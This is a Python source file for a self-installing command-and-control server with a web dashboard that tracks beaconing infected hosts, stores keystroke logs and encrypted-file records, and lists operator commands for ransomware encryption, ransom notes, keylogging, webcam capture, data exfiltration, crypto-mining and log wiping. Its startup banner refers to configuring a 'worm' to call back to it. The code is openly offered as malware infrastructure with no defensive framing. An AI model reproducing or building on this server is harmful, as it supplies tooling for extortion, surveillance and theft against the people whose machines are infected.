#!/usr/bin/env python3
"""
Universal C2 Server - Download and Run
Single file executable - just run: python3 c2_server.py
"""

import os
import sys
import subprocess
import urllib.request

# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================

def install_dependencies():
    """Auto-install required packages if missing"""
    required = ['flask', 'flask-socketio', 'python-socketio', 'eventlet', 'netifaces']
    missing = []
    
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"📦 Installing dependencies: {', '.join(missing)}...")
        for pkg in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
        print("✅ Dependencies installed!\n")

# Install dependencies first
install_dependencies()

# ============================================================
# IMPORTS
# ============================================================

from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO, emit
import json, time, socket, secrets, getpass, platform, uuid, sqlite3
from pathlib import Path

# ============================================================
# CONFIGURATION MANAGEMENT
# ============================================================

class ConfigManager:
    def __init__(self):
        self.config_dir = Path.home() / '.c2_server'
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / 'config.json'
        self.config = self.load_or_create()
    
    def load_or_create(self):
        if self.config_file.exists():
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            return self.first_time_setup()
    
    def first_time_setup(self):
        print("\n" + "="*60)
        print("WELCOME TO C2 SERVER - FIRST TIME SETUP")
        print("="*60)
        print("\nPlease configure your server:\n")
        
        username = input("Admin username [admin]: ").strip() or "admin"
        
        while True:
            password = getpass.getpass("Admin password (min 8 chars): ")
            if len(password) < 8:
                print("Password must be at least 8 characters")
                continue
            confirm = getpass.getpass("Confirm password: ")
            if password != confirm:
                print("Passwords do not match")
                continue
            break
        
        print("\nDetecting available IP addresses...")
        ips = self.get_local_ips()
        for i, ip in enumerate(ips, 1):
            print(f"  {i}. {ip}")
        print(f"  {len(ips)+1}. Custom IP")
        
        choice = input(f"\nSelect IP (1-{len(ips)+1}): ")
        try:
            choice = int(choice)
            if 1 <= choice <= len(ips):
                ip = ips[choice-1]
            else:
                ip = input("Enter custom IP: ").strip()
        except:
            ip = input("Enter custom IP: ").strip()
        
        port = input("Port [5000]: ").strip()
        port = int(port) if port else 5000
        
        domain = input("C2 domain (for DNS beaconing) [localhost]: ").strip() or "localhost"
        secret_key = secrets.token_hex(32)
        
        config = {
            'username': username,
            'password': password,
            'ip': ip,
            'port': port,
            'domain': domain,
            'secret_key': secret_key,
            'setup_complete': True,
            'setup_date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)
        os.chmod(self.config_file, 0o600)
        
        print("\n" + "="*60)
        print("✅ CONFIGURATION SAVED")
        print("="*60)
        print(f"Username: {username}")
        print(f"IP Address: {ip}:{port}")
        print(f"Domain: {domain}")
        print(f"Config saved to: {self.config_file}")
        print("="*60)
        
        return config
    
    def get_local_ips(self):
        ips = []
        try:
            import netifaces
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if ip != '127.0.0.1' and not ip.startswith('169.254'):
                            ips.append(ip)
        except:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ips.append(s.getsockname()[0])
                s.close()
            except:
                pass
            ips.append('127.0.0.1')
        
        ips = list(dict.fromkeys(ips))
        return ips if ips else ['127.0.0.1']
    
    def get(self, key, default=None):
        return self.config.get(key, default)

# ============================================================
# INITIALIZE CONFIG
# ============================================================

config_manager = ConfigManager()

# App configuration
app = Flask(__name__)
app.secret_key = config_manager.get('secret_key')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

SERVER_IP = config_manager.get('ip')
SERVER_PORT = config_manager.get('port')
C2_DOMAIN = config_manager.get('domain')
ADMIN_USERNAME = config_manager.get('username')
ADMIN_PASSWORD = config_manager.get('password')

# Database path
DB_PATH = Path.home() / '.c2_server' / 'c2_database.db'

# ============================================================
# HTML TEMPLATES
# ============================================================

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .login-container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 24px;
            width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .login-container h1 { text-align: center; margin-bottom: 30px; }
        .login-container h1 span { color: #ff6b35; }
        .login-container input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            color: white;
            font-size: 15px;
        }
        .login-container input:focus { outline: none; border-color: #ff6b35; }
        .login-container button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff6b35, #e55a2b);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        .login-container button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,107,53,0.3); }
        .error { color: #ff4444; text-align: center; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>🕵️ <span>C2</span> Server</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
    </div>
</body>
</html>
'''

DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0a1a; color: #fff; padding: 20px; }
        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 24px 30px; border-radius: 16px; margin-bottom: 24px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 span { color: #ff6b35; }
        .hosts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .host-card { background: rgba(255,255,255,0.03); border-radius: 16px; padding: 20px; border: 1px solid rgba(255,255,255,0.06); }
        .host-card:hover { border-color: #ff6b35; }
        .host-card .hostname { font-size: 18px; font-weight: 600; }
        .host-card .info { font-size: 13px; color: #aaa; margin: 4px 0; }
        .no-hosts { text-align: center; padding: 80px 20px; color: #666; }
        .nav-links a { color: #888; text-decoration: none; padding: 8px 14px; border-radius: 8px; }
        .nav-links a:hover { background: rgba(255,255,255,0.05); }
        .nav-links .logout { color: #ff4444; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 10px; font-weight: 600; background: rgba(0,255,136,0.15); color: #00ff88; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕵️ <span>C2</span> Server</h1>
        <div class="nav-links">
            <a href="/logout" class="logout">Logout</a>
        </div>
    </div>
    <div class="hosts-grid" id="hostsGrid">
        <div class="no-hosts">
            <div style="font-size: 48px; margin-bottom: 20px;">📡</div>
            <div>No hosts connected yet</div>
            <div style="font-size: 14px; margin-top: 10px;">Waiting for beacons...</div>
        </div>
    </div>
    <script>
        setInterval(() => {
            fetch('/api/hosts')
                .then(r => r.json())
                .then(hosts => {
                    const grid = document.getElementById('hostsGrid');
                    if (hosts.length === 0) {
                        grid.innerHTML = '<div class="no-hosts"><div style="font-size:48px;margin-bottom:20px;">📡</div><div>No hosts connected</div></div>';
                        return;
                    }
                    grid.innerHTML = hosts.map(h => `
                        <div class="host-card">
                            <div class="hostname">${h.hostname}</div>
                            <div class="info">${h.os} • ${h.status}</div>
                            <div class="info">📁 ${h.encrypted_count || 0} encrypted</div>
                        </div>
                    `).join('');
                });
        }, 5000);
    </script>
</body>
</html>
'''

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS hosts
                 (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, os_version TEXT,
                  architecture TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP,
                  status TEXT, ip TEXT, keylogger_active INTEGER,
                  webcam_available INTEGER, files_encrypted INTEGER,
                  mining_active INTEGER, encrypted_ext TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, host_id TEXT,
                  command TEXT, params TEXT, status TEXT, result TEXT,
                  issued TIMESTAMP, executed TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS beacons
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, host_id TEXT,
                  data TEXT, timestamp TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, host_id TEXT,
                  key TEXT, timestamp TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS encrypted_files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, host_id TEXT,
                  file_path TEXT, size INTEGER, timestamp TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error='Invalid credentials')
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/api/hosts')
def api_hosts():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    hosts = []
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM hosts ORDER BY last_seen DESC')
        for row in c.fetchall():
            hosts.append({
                'id': row[0], 'hostname': row[1], 'os': row[2],
                'status': row[7], 'ip': row[8],
                'keylogger_active': bool(row[9]),
                'webcam_available': bool(row[10]),
                'files_encrypted': bool(row[11]),
                'mining_active': bool(row[12])
            })
        conn.close()
    except:
        pass
    return jsonify(hosts)

@app.route('/api/command', methods=['POST'])
def api_command():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    host_id = data.get('host_id')
    command = data.get('command')
    params = data.get('params', {})
    
    if not host_id or not command:
        return jsonify({'error': 'Missing host_id or command'}), 400
    
    return jsonify({
        'success': True,
        'command_id': 1,
        'message': f'Command {command} sent to {host_id}'
    })

@app.route('/api/beacon', methods=['POST'])
def api_beacon():
    data = request.json
    if not data:
        return jsonify({'error': 'No data'}), 400
    
    host_id = data.get('host_id', str(uuid.uuid4()))
    hostname = data.get('hostname', 'unknown')
    os_type = data.get('os', 'unknown')
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO hosts 
                 (id, hostname, os, os_version, architecture, first_seen, last_seen, status, ip)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (host_id, hostname, os_type, data.get('os_version', ''),
               data.get('architecture', ''), time.strftime('%Y-%m-%d %H:%M:%S'),
               time.strftime('%Y-%m-%d %H:%M:%S'), 'online', request.remote_addr))
    c.execute('INSERT INTO beacons (host_id, data, timestamp) VALUES (?, ?, ?)',
              (host_id, json.dumps(data), time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'success', 'commands': []})

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    return jsonify({'success': True})

@app.route('/api/keylogs/<host_id>')
def api_keylogs(host_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    logs = []
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT key, timestamp FROM keylogs WHERE host_id = ? ORDER BY timestamp DESC LIMIT 100', (host_id,))
        for row in c.fetchall():
            logs.append({'key': row[0], 'timestamp': row[1]})
        conn.close()
    except:
        pass
    return jsonify(logs)

@app.route('/api/stats')
def api_stats():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM hosts')
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM hosts WHERE status = 'online'")
    online = c.fetchone()[0]
    conn.close()
    
    return jsonify({'total_hosts': total, 'online_hosts': online})

@app.route('/api/command_templates')
def api_command_templates():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    templates = {
        'status': {'params': {}},
        'encrypt': {'params': {'password': ''}},
        'encrypt_files': {'params': {'file_paths': [], 'password': ''}},
        'encrypt_directory': {'params': {'directory': '', 'password': '', 'recursive': True}},
        'decrypt': {'params': {'password': ''}},
        'decrypt_files': {'params': {'file_paths': [], 'password': ''}},
        'decrypt_directory': {'params': {'directory': '', 'password': '', 'recursive': True}},
        'keylog_start': {'params': {'duration': 60}},
        'keylog_stop': {'params': {}},
        'webcam_capture': {'params': {}},
        'webcam_stream': {'params': {'duration': 10, 'frame_rate': 5}},
        'screenshot': {'params': {}},
        'execute': {'params': {'command': 'whoami'}},
        'exfiltrate': {'params': {'max_files': 50}},
        'start_mining': {'params': {'wallet_address': ''}},
        'stop_mining': {'params': {}},
        'display_ransom_note': {'params': {}},
        'block_computer': {'params': {'action': 'lock'}},
        'clear_logs': {'params': {}},
        'self_destruct': {'params': {'confirm': True}}
    }
    return jsonify(templates)

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM keylogs')
    c.execute('DELETE FROM beacons')
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# ============================================================
# WEBSOCKET EVENTS
# ============================================================

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'Connected to C2 server'})

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🕵️ C2 SERVER v3.0")
    print("="*60)
    print(f"🌐 Server URL: http://{SERVER_IP}:{SERVER_PORT}")
    print(f"🔑 Username: {ADMIN_USERNAME}")
    print(f"🔑 Password: {'*' * len(ADMIN_PASSWORD)}")
    print(f"📡 Domain: {C2_DOMAIN}")
    print(f"📁 Config: {config_manager.config_file}")
    print("="*60)
    print("📡 Waiting for connections...")
    print("="*60)
    print()
    print("💡 To configure worm, set:")
    print(f"   C2_SERVER = '{SERVER_IP}'")
    print()
    print("⚠️  Credentials saved in ~/.c2_server/config.json")
    print("="*60)
    
    socketio.run(app, host=SERVER_IP, port=SERVER_PORT, debug=False, allow_unsafe_werkzeug=True)
